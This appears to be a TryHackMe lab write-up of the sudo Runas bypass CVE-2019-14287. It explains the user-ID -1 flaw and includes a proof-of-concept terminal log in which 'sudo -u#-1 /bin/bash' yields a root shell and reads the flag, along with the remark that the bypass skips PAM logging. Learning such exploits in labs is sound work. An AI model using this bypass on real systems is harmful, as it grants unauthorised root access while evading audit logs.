# thm: Sudo Security Bypass CVE-2019-14287

https://tryhackme.com/room/sudovulnsbypass

## Background
	
Runas specification: Runas refers to RUN AS a user. So Runas specification means it can be run as a specific user.

- Sudo (short for “superuser do”) allows a system administrator to delegate privileges, enabling specified users or groups to execute certain commands as the root user or another specified account, while maintaining an audit trail of executed commands and their arguments. The -u option is used to specify the target user identity under which the command should be executed. For example, the whoami command can be run with a specified UID (e.g., 1234) by using the -u option.
```
$ sudo -u#1234 whoami
```
- Sudoers: The configuration file for sudo is located at /etc/sudoers. For example, to allow a specific <user> to execute any command as any user except root, the following rule can be added:
```
<user> ALL=(ALL:!root) NOPASSWD: ALL
```
- PAM: PAM (Pluggable Authentication Modules) is a system used in Unix-like operating systems to handle authentication (checking if a user is allowed to log in or perform certain actions). It provides a flexible way to integrate various authentication mechanisms without needing to modify individual applications. Instead of hardcoding authentication logic into applications, they use PAM to handle it, allowing for easy updates or changes to the authentication process. Configuration is usually in `/etc/pam.d/` or `/etc/pam.conf`. Think of PAM like a middleware for authentication: the application asks PAM “is this user valid?” and PAM handles the actual checking.
## Analysis

The vulnerability of interest occurs in a specific scenario where it is possible to execute a command with root privileges, even when the Runas specification in sudoers explicitly prohibits execution as root while using the ALL clause.

The setresuid(2) and setreuid(2) system calls, which sudo uses to change the user ID before executing a command, treat the value -1 (or its unsigned equivalent 4294967295) as special, resulting in the user ID not being changed when this value is used.

As a result:

    $ sudo -u#-1 id

or

    $ sudo -u#4294967295 id

will actually return 0(i.e. root)

This is because the `sudo` command itself is already running as user ID 0 so when `sudo` tries to change to user ID -1(the setresuid(2) and setreuid(2) system calls), no change occurs. This results in sudo log entries that report the command as being run by user ID 4294967295 and not root (or user ID 0). Additionally, because the user ID specified via the -u option does not exist in the password database, no PAM session modules will be run.

For example, running a command:

    $ sudo -u#1001 whoami

When the command is executed, pam_unix(sudo:session) logs the session open and close events. However, when running a commnad:

    $ sudo -u#-1 whoami

then, pam_unix(sudo:session) will not be executed. Making it almost impossible to detect from the log file.


## PoC
```
tryhackme@sudo-privesc:~$ sudo -l
Matching Defaults entries for tryhackme on sudo-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tryhackme may run the following commands on sudo-privesc:
    (ALL, !root) NOPASSWD: /bin/bash
tryhackme@sudo-privesc:~$ sudo whoami
[sudo] password for tryhackme: 
Sorry, user tryhackme is not allowed to execute '/usr/bin/whoami' as root on sudo-privesc.
tryhackme@sudo-privesc:~$ sudo -u#-1 whoami
[sudo] password for tryhackme: 
Sorry, user tryhackme is not allowed to execute '/usr/bin/whoami' as #-1 on sudo-privesc.
tryhackme@sudo-privesc:~$ sudo -u#-1 /bin/bash
root@sudo-privesc:~# whoami
root
root@sudo-privesc:~# ls
root@sudo-privesc:~# cat /root/root.txt
THM{l33t_s3cur1ty_bypass}
root@sudo-privesc:~# 
```
